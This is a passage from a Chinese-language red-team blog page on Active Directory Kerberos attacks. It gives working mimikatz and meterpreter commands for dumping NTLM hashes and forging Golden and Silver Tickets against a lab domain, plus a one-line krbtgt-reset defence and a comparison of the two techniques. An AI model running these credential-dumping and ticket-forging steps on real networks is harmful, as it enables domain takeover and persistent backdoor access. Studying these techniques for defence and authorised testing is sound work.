+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir \\DC\c$</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用meterpreter中的kiwi模块</strong> </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter&gt; load kiwi</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建票据</span></span><br><span class="line">meterpreter&gt; golden_ticket_create -d wintrysec.lab -u Administrator -s S-1-5-21-1160434164-3042164129-2463410311 -k a8424e3f13e1253ea732a5245f2f4266 -t /tmp/krbtgt.ticket</span><br><span class="line"></span><br><span class="line"><span class="comment">#注入到内存</span></span><br><span class="line">meterpreter&gt; kerberos_ticket_use /tmp/krbtgt.ticket</span><br><span class="line"></span><br><span class="line"><span class="comment">#然后验证权限</span></span><br><span class="line">dir \\DC\c$</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>当拿到域控后，通过伪造黄金票据，可以在域中留下一个畅通全域的后门</strong></p>
+<p><strong>防御方法：</strong>修改域管理员密码后，同时也要修改<code>krbtgt</code>用户的密码</p>
+</blockquote>
+<h2 id="白银票据-（Silver-Ticket）"><a href="#白银票据-（Silver-Ticket）" class="headerlink" title="白银票据 （Silver Ticket）"></a>白银票据 （Silver Ticket）</h2><blockquote>
+<p><strong>白银票据</strong>：即伪造的<code>TGS</code>票据，也称服务票据ST。</p>
+<p>攻击者通过伪造合法的TGS，可以直接发送给Server，访问指定的某个服务。</p>
+<p>当拥有Server(Service) Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket。</p>
+<p>Server Session Key在未发送Ticket之前，服务器是不知道Server Session Key是什么的。</p>
+<p>因此，银票的关键也在于Server的HTLM-Hash</p>
+</blockquote>
+<p><strong>获取Server（目标服务器）的NTML hash</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::logonpasswords"</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<p>或MSF模块</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; msv</span><br></pre></td></tr></table></figure>
+
+<p><strong>制造白银票据</strong></p>
+<p><strong>（1）清空当前系统的票据</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用系统命令</span></span><br><span class="line">klist purge</span><br></pre></td></tr></table></figure>
+
+<p><strong>（2）伪造票据</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"kerberos::golden /domain:wintrysec.lab /sid:S-1-5-21-1160434164-3042164129-2463410311 /target:DC.wintrysec.lab /service:CIFS /rc4:f0e889883425d83b0071e789507b3e6b /user:admin666 /ptt"</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>（3）验证权限</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir \\DC\c$</span><br></pre></td></tr></table></figure>
+
+<h2 id="黄金票据和白银票据的不同"><a href="#黄金票据和白银票据的不同" class="headerlink" title="黄金票据和白银票据的不同"></a>黄金票据和白银票据的不同</h2><p><strong>访问权限不同：</strong></p>
+<ul>
+<li>Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限</li>
+<li>Silver Ticket：伪造TGS，只能访问指定的服务</li>
+</ul>
+<p><strong>加密方式不同：</strong></p>
+<ul>
+<li>Golden Ticket由Kerberos的Hash加密</li>
+<li>Silver Ticket由服务账号（通常为计算机账户）Hash加密</li>
+</ul>
+<p><strong>认证流程不同：</strong></p>
+<ul>
+<li>Golden Ticket的利用过程需要访问域控，</li>
+<li>而Silver Ticket不需要</li>
+</ul>
+
+            </div>
+        
+        <footer class="article-footer">
+        </footer>
+    </div>
+</article>
+
+
+    
+<nav id="article-nav">
+    
+        <a href="/2021/04/28/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%907%20%E8%93%9D%E9%98%9F%E3%80%91%E9%98%B2%E5%AE%88%E7%AD%96%E7%95%A5/%E3%80%90%E8%93%9D%E9%98%9F%E3%80%91%E9%98%B2%E5%AE%88%E7%AD%96%E7%95%A5/" id="article-nav-newer" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Newer</strong>
+            <div class="article-nav-title">
+                
+                    【蓝队】2020攻防演练防守心得
+                
+            </div>
+        </a>
+    
+    
+        <a href="/2021/04/28/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%906%E3%80%91%E5%9F%9F%E6%B8%97%E9%80%8F/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Older</strong>
+            <div class="article-nav-title">【4】票据传递攻击</div>
+        </a>
+    
+</nav>
+
+
+
+
+
+    
+    
+
+
+
+
+<!-- baidu url auto push script -->
+<script type="text/javascript">
+    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
+</script>     
+
+
+</section>
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            wintrysec &copy; 2021 
+            <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/80x15.png" /></a>
+            <br> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme - <a href="https://github.com/zthxxx/hexo-theme-Wikitten" target="_blank" rel="noopener">wikitten</a>
+            
+                <br>
+                <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span></span>
+                &nbsp;|&nbsp;
+                <span id="busuanzi_container_site_pv"><i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span></span>
+            
+        </div>
+    </div>
+</footer>
+
+        
+
+    
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
+    
+    
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+    
+    
+        <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true,
+            TeX: {
+                equationNumbers: {
+                  autoNumber: 'AMS'
+                }
+            }
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    
+
+
+
+<!-- Custom Scripts -->
+
+<script src="/js/main.js"></script>
+
+
+    </div>
+</body>
+</html>
